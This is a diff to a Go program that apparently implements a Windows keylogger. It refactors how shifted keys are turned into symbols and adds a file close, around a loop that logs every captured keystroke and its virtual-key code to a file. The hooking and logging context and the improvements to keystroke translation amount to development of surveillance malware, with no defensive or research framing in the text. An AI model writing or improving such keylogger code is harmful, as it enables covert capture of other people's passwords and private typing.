@@ -155,6 +155,13 @@ func getKeyState(vkCode int) int {
 	return int(ret)
 }
 
+var symbolMap = map[byte]string{
+	'`': "~", '1': "!", '2': "@", '3': "#", '4': "$", '5': "%", 
+	'6': "^", '7': "&", '8': "*", '9': "(", '0': ")", '-': "_", 
+	'=': "+", '[': "{", ']': "}", '\\': "|", ';': ":", '\'': "\"", 
+	',': "<", '.': ">", '/': "?",
+}
+
 func transform(s string, shift bool) string {
 	if len(s) != 1 {
 		return s
@@ -176,27 +183,15 @@ func transform(s string, shift bool) string {
 		return string(c + ('a' - 'A'))
 	}
 
-	if c >= '1' && c <= '9' {
-		if shift {
-			return string(" !@#$%^&*()_"[c-'0'])
-		}
-		return s
-	}
-
-	symbols := "`1234567890-=[]\\;',./"
-	symbolsShift := "~!@#$%^&*()_+{}|:\"<>?"
-
-	for i := 0; i < len(symbols); i++ {
-		if c == symbols[i] {
-			if shift {
-				return string(symbolsShift[i])
-			}
-			return string(c)
+	if shift {
+		if transformed, exists := symbolMap[c]; exists {
+			return transformed
 		}
 	}
 
 	return s
 }
+
 
 func UnhookWindowsHookEx(hhk HHOOK) bool {
 	ret, _, _ := procUnhookWindowsHookEx.Call(uintptr(hhk))
@@ -224,11 +219,12 @@ func main() {
 		fmt.Println("Error creating file:", err)
 		return
 	}
+	defer file.Close()
+
 
 	for {
 		value := <-valueChan
 		vkCode := <-vkodeChan
 		fmt.Fprintf(file, "%s: %d\n", value, vkCode)
 	}
-
 }
